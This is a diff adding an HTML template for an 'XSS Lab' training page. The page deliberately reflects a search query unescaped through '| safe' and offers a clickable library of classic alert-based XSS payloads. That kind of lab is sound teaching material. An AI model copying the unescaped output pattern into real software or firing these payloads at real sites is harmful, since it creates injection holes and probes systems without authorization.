@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>XSS Lab</title>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Geist:wght@300;400;600&display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" href="/static/style.css">
+</head>
+
+<body>
+
+    <!-- NAV -->
+    <div class="nav">
+        <div class="nav-brand" onclick="location.href='/vuln/'" style="cursor:pointer;">
+            <div class="nav-brand-dot"></div>
+            Vulnerability Lab
+        </div>
+    </div>
+
+    <div class="test-page">
+
+        <!-- LEFT -->
+        <div class="col">
+
+            <!-- SEARCH -->
+            <form method="GET" class="panel">
+                <div class="panel-header">Search</div>
+                <div class="panel-body">
+                    <input id="searchInput" class="input" name="q" placeholder="Search something...">
+                    <br><br>
+                    <button class="btn btn-primary">Search</button>
+                </div>
+            </form>
+
+            <!-- RESULT -->
+            <div class="panel">
+                <div class="panel-header">Reflected Output</div>
+                <div class="panel-body">
+                    <!-- ❌ INTENTIONALLY VULNERABLE -->
+                    {{ query | safe }}
+                </div>
+            </div>
+
+            <!-- URL -->
+            <div class="panel">
+                <div class="panel-header">URL</div>
+                <div class="panel-body">
+                    <code>?q={{ query }}</code>
+                </div>
+            </div>
+
+        </div>
+
+        <!-- RIGHT -->
+        <div class="col">
+
+            <div class="panel">
+                <div class="panel-header">🔥 Payload Library</div>
+                <div class="panel-body">
+
+                    <div class="payload" onclick="runPayload(`<script>alert('XSS')</script>`)">
+                        &lt;script&gt;alert('XSS')&lt;/script&gt;
+                    </div>
+
+                    <div class="payload" onclick="runPayload(`<img src=x onerror=alert(1)>`)">
+                        &lt;img src=x onerror=alert(1)&gt;
+                    </div>
+
+                    <div class="payload" onclick="runPayload(`<svg onload=alert(1)>`)">
+                        &lt;svg onload=alert(1)&gt;
+                    </div>
+
+                    <div class="payload"
+                        onclick="runPayload('&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;')">
+                        iframe javascript
+                    </div>
+
+                </div>
+            </div>
+
+        </div>
+
+    </div>
+
+    <script>
+        function runPayload(payload) {
+            const url = '?q=' + encodeURIComponent(payload);
+            window.location.href = url;
+        }
+    </script>
+
+</body>
+
+</html>
